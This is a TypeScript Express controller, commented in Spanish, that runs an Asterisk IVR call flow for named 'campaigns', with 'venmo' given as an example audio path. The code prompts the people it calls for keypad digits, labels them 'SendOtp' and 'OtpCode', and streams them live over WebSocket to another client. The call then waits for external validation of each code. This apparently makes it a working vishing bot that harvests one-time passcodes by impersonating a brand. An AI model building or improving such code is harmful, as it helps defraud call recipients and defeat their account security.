import { Request, Response } from 'express';
import { CampaignService, ActionData } from '../../modules/campaigns/campaign-service';
import { CallStore } from '../../store/call-store';
import { CampaignConfig } from '../../config/campaign-config';
import { WebSocketService } from '../../modules/websocket/websocket-service';

/**
 * Controlador que maneja las acciones del IVR
 * Genera respuestas XML para Asterisk basado en el estado de la llamada
 */
export class ActionController {
    private campaignService: CampaignService;
    private callStore: CallStore;
    private webSocketService: WebSocketService;
    
    constructor() {
        this.campaignService = CampaignService.getInstance();
        this.callStore = CallStore.getInstance();
        this.webSocketService = WebSocketService.getInstance();
    }
    
    /**
     * GET /action/:status
     * Maneja las acciones del flujo IVR y genera XML responses
     */
    public handleAction = async (req: Request, res: Response): Promise<void> => {
        try {
            let { status } = req.params;
            const { uuid, Digits } = req.query;
            
            if (!uuid) {
                const errorXml = `<Response>
                    <Play>https://example.com/error.wav</Play>
                </Response>`;
                
                res.setHeader("Content-Type", "application/xml");
                res.status(200).send(errorXml);
                return;
            }
            
            // Buscar campaign desde CallStore (como el WebSocket original)
            const callData = this.callStore.getCall(uuid as string);
            if (!callData) {
                const errorXml = `<Response>
                    <Play>https://example.com/error.wav</Play>
                </Response>`;
                
                res.setHeader("Content-Type", "application/xml");
                res.status(200).send(errorXml);
                return;
            }
            
            const campaign = callData.campaign;
            
            // No enviar notificación de inicio de acción (no existía en sistema antiguo)
            
            // 🆕 LÓGICA ESPECIAL PARA MENÚS (options)
            // Si estamos en "options" y hay dígitos, decidir el siguiente paso
            if (status === 'options' && Digits) {
                const digit = Digits as string;
                
                // Dígito 1 → option1, cualquier otro → option2
                if (digit === '1') {
                    this.callStore.updateCall(uuid as string, { selectedOption: '1' });
                    status = 'option1';
                } else {
                    // Cualquier otro dígito va a option2
                    this.callStore.updateCall(uuid as string, { selectedOption: '2' });
                    status = 'option2';
                }
            }
            
            // Obtener acciones dinámicamente desde la API
            
            
            const actionData = await this.campaignService.getActionData(campaign as string, status as string);
            
            if (!actionData) {
                console.error(`❌ NO SE ENCONTRÓ LA ACCIÓN '${status}' EN CAMPAÑA '${campaign}'`);
                
                // Devolver XML de error en lugar de JSON
                const errorXml = `<Response>
                    <Play>https://example.com/error.wav</Play>
                </Response>`;
                
                res.setHeader("Content-Type", "application/xml");
                res.status(200).send(errorXml);
                return;
            }
            
            // Procesar lógica específica del estado
            await this.processActionLogic(status as string, uuid as string, Digits as string);
            
            // 🔧 FIX: Si gather1 recibió dígitos, redirigir a confirm después de procesarlos
            if (status === 'gather1' && Digits) {
                // Obtener la configuración de gather1 para saber a dónde redirigir
                const gather1ActionData = await this.campaignService.getActionData(campaign as string, 'gather1');
                if (gather1ActionData?.next) {
                    // Redirigir a confirm (o el next configurado)
                    const baseUrl = process.env.ACTION_BASE_URL || 'http://localhost:3000';
                    const redirectUrl = gather1ActionData.next.startsWith('http') 
                        ? gather1ActionData.next 
                        : `${baseUrl}/action/${gather1ActionData.next}`;
                    
                    const redirectXml = `<Response>
                        <Redirect>${redirectUrl}?uuid=${uuid}</Redirect>
                    </Response>`;
                    
                    res.setHeader("Content-Type", "application/xml");
                    res.status(200).send(redirectXml);
                    return;
                }
            }
            
            // Generar respuesta XML (sin campaign en la URL, solo uuid como el original)
            const xmlResponse = this.generateXMLResponse(status as string, actionData, uuid as string, campaign as string);
            

            res.setHeader("Content-Type", "application/xml");
            res.status(200).send(xmlResponse);
            
        } catch (error) {
            console.error('❌ Error en handleAction:', error);
            
            // Devolver XML de error en lugar de JSON
            const errorXml = `<Response>
                <Play>https://example.com/error.wav</Play>
            </Response>`;
            
            res.setHeader("Content-Type", "application/xml");
            res.status(200).send(errorXml);
        }
    };
    

    
    /**
     * Verifica si una campaña tiene dos gathers (detecta automáticamente si existe gather1)
     */
    private async isTwoGatherCampaign(campaignName: string): Promise<boolean> {
        const gather1Action = await this.campaignService.getActionData(campaignName, 'gather1');
        return gather1Action !== null;
    }
    
    /**
     * Procesa la lógica específica de cada estado
     */
    private async processActionLogic(status: string, uuid: string, digits?: string): Promise<void> {
        const callData = this.callStore.getCall(uuid);
        
        switch (status) {
            case 'gather':
                if (digits) {
                    // 🔧 FIX: Resetear gatherStage cuando se vuelve a gather desde invalid
                    const callDataGather = this.callStore.getCall(uuid);
                    const campaignGather = callDataGather?.campaign;
                    
                    // ✅ Detectar automáticamente si la campaña tiene dos gathers
                    if (campaignGather && await this.isTwoGatherCampaign(campaignGather)) {
                        // Asegurar que gatherStage esté en 'first' cuando se vuelve a gather
                        // Esto mantiene la bandera de que aún no ha pasado el primer gather
                        this.callStore.updateCall(uuid, { gatherStage: 'first' });
                    }
                    
                    // Enviar mensaje WebSocket con SendOtp (gather siempre envía SendOtp)
                    this.webSocketService.sendToCallId(uuid, {
                        callId: uuid,
                        SendOtp: digits
                    });
                    
                    // Aquí se puede enviar OTP, guardar en memoria, etc.
                    await this.sendOTP(uuid, digits);
                    
                    // 🔧 FIX: gather NO envía OtpCode directamente
                    // gather → confirm → confirm envía OtpCode → espera validación externa
                    // El flujo es: gather (SendOtp) → confirm (OtpCode) → endpoint valida
                }
                break;
                
            // 🆕 CASO PARA SEGUNDO GATHER (gather1) - Campañas con dos Gather
            // Comportamiento IDÉNTICO a gather: solo procesar cuando hay dígitos
            case 'gather1':
                if (digits) {
                    // Marcar que estamos en el segundo gather cuando se reciben dígitos
                    const callDataGather1 = this.callStore.getCall(uuid);
                    const campaignGather1 = callDataGather1?.campaign;
                    
                    // ✅ Detectar automáticamente si la campaña tiene dos gathers
                    if (campaignGather1 && await this.isTwoGatherCampaign(campaignGather1)) {
                        // Actualizar gatherStage cuando se reciben dígitos
                        this.callStore.updateCall(uuid, { 
                            gatherStage: 'second',
                            state: 'gather1'
                        });
                    }
                    
                    // 🔧 FIX: Enviar como OtpCode (igual que confirm) en lugar de SendOtp
                    this.webSocketService.sendToCallId(uuid, {
                        callId: uuid,
                        OtpCode: digits
                    });
                    
                    // Aquí se puede enviar OTP, guardar en memoria, etc.
                    await this.sendOTP(uuid, digits);
                    
                    // 🔧 FIX: Después de procesar dígitos, redirigir a confirm (según configuración)
                    // Esto se hace modificando el status para que generateXMLResponse redirija correctamente
                    // Pero como ya generamos el XML, necesitamos redirigir en el XML mismo
                }
                break;
                
            // 🆕 NUEVOS CASOS PARA CAMPAÑAS CON MENÚ
            case 'option1':
            case 'option2':
                if (digits) {
                    // Enviar el número ingresado (ej: teléfono, cuenta, etc.)
                    this.webSocketService.sendToCallId(uuid, {
                        callId: uuid,
                        SendOtp: digits
                    });
                    
                    await this.sendOTP(uuid, digits);
                }
                break;
                
            case 'confirm':
                // confirm decide según gatherStage
                const callDataConfirm = this.callStore.getCall(uuid);
                const campaignConfirm = callDataConfirm?.campaign;
                const gatherStageConfirm = callDataConfirm?.gatherStage;
                // ✅ Detectar automáticamente si la campaña tiene dos gathers
                const isTwoGatherConfirm = campaignConfirm && await this.isTwoGatherCampaign(campaignConfirm);
                
                // Si estamos en el segundo gather (gatherStage === 'second'), confirm debe redirigir a completed
                if (isTwoGatherConfirm && gatherStageConfirm === 'second') {
                    // Redirigir directamente a completed (no esperar validación externa)
                    // Esto se hace actualizando el estado, pero el XML ya se generó
                    // La redirección real la hace el endpoint de validación cuando redirige a confirm
                    // Por ahora solo marcamos que debe ir a completed
                    this.callStore.updateCall(uuid, { state: 'completed' });
                } else if (digits) {
                    // Primer gather o gather normal - lógica original
                    // Obtener la opción seleccionada previamente
                    const selectedOption = callDataConfirm?.selectedOption;
                    
                    // Marcar que estamos en el primer gather para campañas con dos Gather
                    if (isTwoGatherConfirm && (!gatherStageConfirm || gatherStageConfirm === 'first')) {
                        this.callStore.updateCall(uuid, { gatherStage: 'first' });
                    }
                    
                    // Enviar mensaje WebSocket con la opción seleccionada
                    this.webSocketService.sendToCallId(uuid, {
                        callId: uuid,
                        OtpCode: digits,
                        selectedOption: selectedOption || null
                    });
                    
                    // Aquí se puede validar OTP
                    await this.validateOTP(uuid, digits);
                }
                break;
                
            case 'completed':
            case 'completed_option1':
            case 'completed_option2':
                break;
            
            // 🚫 IGNORAMOS: invalid_option (no se usa en este flujo simplificado)
            case 'invalid_option':
                break;
            
            // ✅ 'invalid' SÍ se usa (para código OTP incorrecto)
            case 'invalid':
                // El sistema ya maneja esto automáticamente
                break;
                
            default:
                // No action needed
                break;
        }
    }
    
    /**
     * Randomiza el timeout de answer entre 10-15 segundos
     * Solo aplica a 'answer', el resto mantiene su timeout original
     */
    private getRandomizedTimeout(status: string, originalTimeout: number): number {
        // Solo randomizar para 'answer'
        if (status === 'answer') {
            const min = 10;
            const max = 15;
            const randomTimeout = Math.floor(Math.random() * (max - min + 1)) + min;
            return randomTimeout;
        }
        
        // Para todo lo demás, mantener el timeout original
        return originalTimeout;
    }
    
    /**
     * Construye la ruta del audio basada en la campaña y el estado
     * Formato: custom/{campaign}/{status}
     * Ejemplo: custom/venmo/answer
     */
    private buildAudioPath(campaign: string, status: string): string {
        return `custom/${campaign}/${status}`;
    }
    
    /**
     * Genera la respuesta XML para Asterisk
     */
    private generateXMLResponse(status: string, actionData: ActionData, uuid: string, campaign: string): string {
        const { next, timeout, dgts, finishOnKey } = actionData;
        
        // 🆕 Construir ruta de audio desde el directorio local
        // Formato: custom/{campaign}/{status}
        const audioPath = this.buildAudioPath(campaign, status);
        
        // Casos que SOLO reproducen audio sin Gather (esperan respuesta externa)
        // confirm siempre espera la validación externa, sin importar el gatherStage
        // ❌ confirm NO usa timeout randomizado, mantiene el original
        if (status === 'confirm') {
            return `<Response>
                <Play timeout="${timeout}">${audioPath}</Play>
            </Response>`;
        }
        
        // ✅ Randomizar timeout solo para answer y otros gathers (10-15 segundos)
        const finalTimeout = this.getRandomizedTimeout(status, timeout);
        
        // Casos que TERMINAN la llamada (completed)
        if (status === 'completed' || status === 'completed_option1' || status === 'completed_option2') {
            return `<Response>
                <Play>${audioPath}</Play>
            </Response>`;
        }
        
        // Casos que necesitan Gather (answer, gather, invalid, options, option1, option2, invalid_option, gather1)
        // 🔧 FIX: gather1 debe llamarse a sí mismo cuando hay dígitos para procesarlos antes de ir a confirm
        // 🔧 FIX: invalid debe redirigir según gatherStage (first → gather, second → gather1)
        let nextUrl: string;
        if (status === 'gather1') {
            // gather1 siempre se llama a sí mismo cuando hay dígitos para procesarlos
            const baseUrl = process.env.ACTION_BASE_URL || 'http://localhost:3000';
            nextUrl = `${baseUrl}/action/gather1`;
        } else if (status === 'invalid') {
            // 🔧 FIX: invalid debe respetar su next de la configuración (confirm)
            // NO forzar redirección a gather - la configuración ya tiene next: "confirm"
            const baseUrl = process.env.ACTION_BASE_URL || 'http://localhost:3000';
            if (next && (next.startsWith('http://') || next.startsWith('https://'))) {
                nextUrl = next;
            } else if (next) {
                nextUrl = `${baseUrl}/action/${next}`;
            } else {
                nextUrl = this.buildNextUrl(status);
            }
        } else if (next && (next.startsWith('http://') || next.startsWith('https://'))) {
            // Si next es una URL completa, usarla tal como está
            nextUrl = next;
        } else if (next) {
            // Si next es relativo (ej: "gather"), construir URL completa
            const baseUrl = process.env.ACTION_BASE_URL || 'http://localhost:3000';
            nextUrl = `${baseUrl}/action/${next}`;
        } else {
            // Si no hay next, construir desde el status actual
            nextUrl = this.buildNextUrl(status);
        }
        
        // 🆕 LÓGICA NUEVA: Determinar modo de gather (dinámico vs fijo)
        // Si finishOnKey está definido y es válido → modo dinámico (numDigits=0)
        // Si NO está finishOnKey → modo fijo (usar dgts como siempre)
        const useDynamicMode = finishOnKey && finishOnKey.length === 1;
        const numDigits = useDynamicMode ? 0 : (dgts || 0);
        const finishKeyAttr = useDynamicMode ? finishOnKey : '';
        
        if (useDynamicMode) {
        }
        
        return `<Response>
            <Play>${audioPath}</Play>
            <Gather
                input="speech dtmf"
                action="${nextUrl}?uuid=${uuid}"
                timeout="${finalTimeout}"
                numDigits="${numDigits}"${finishKeyAttr ? `\n                finishOnKey="${finishKeyAttr}"` : ''}
            />
        </Response>`;
    }
    
    /**
     * Construye la URL del siguiente paso si no está definida en la campaña
     */
    private buildNextUrl(currentStatus: string): string {
        const nextStepMap: { [key: string]: string } = {
            'answer': 'gather',
            'gather': 'confirm', 
            'invalid': 'gather'
        };
        
        const nextStep = nextStepMap[currentStatus] || 'completed';
        const baseUrl = process.env.ACTION_BASE_URL || 'http://localhost:3000';
        return `${baseUrl}/action/${nextStep}`;
    }
    

    
    /**
     * Envía OTP (placeholder para lógica futura)
     */
    private async sendOTP(uuid: string, digits: string): Promise<void> {
        // TODO: Implementar envío de OTP
    }
    
    /**
     * Valida OTP (placeholder para lógica futura)
     */
    private async validateOTP(uuid: string, digits: string): Promise<void> {
        // TODO: Implementar validación de OTP
    }
    
    /**
     * GET /action/debug/campaigns
     * Endpoint de debug para ver campañas cargadas
     */
    public getCampaigns = async (req: Request, res: Response): Promise<void> => {
        try {
            const campaigns = this.campaignService.getAllCachedCampaigns();
            
            res.status(200).json({
                success: true,
                data: campaigns,
                totalCampaigns: Object.keys(campaigns).length,
                timestamp: new Date().toISOString()
            });
            
        } catch (error) {
            console.error('❌ Error obteniendo campañas:', error);
            res.status(500).json({
                success: false,
                message: "Error obteniendo campañas",
            });
        }
    };
    
    /**
     * POST /action/debug/reload
     * Fuerza la recarga de campañas desde la API
     */
    public reloadCampaigns = async (req: Request, res: Response): Promise<void> => {
        try {
            await this.campaignService.reloadCampaigns();
            
            res.status(200).json({
                success: true,
                message: "Campañas recargadas exitosamente",
                timestamp: new Date().toISOString()
            });
            
        } catch (error) {
            console.error('❌ Error recargando campañas:', error);
            res.status(500).json({
                success: false,
                message: "Error recargando campañas",
            });
        }
    };
} 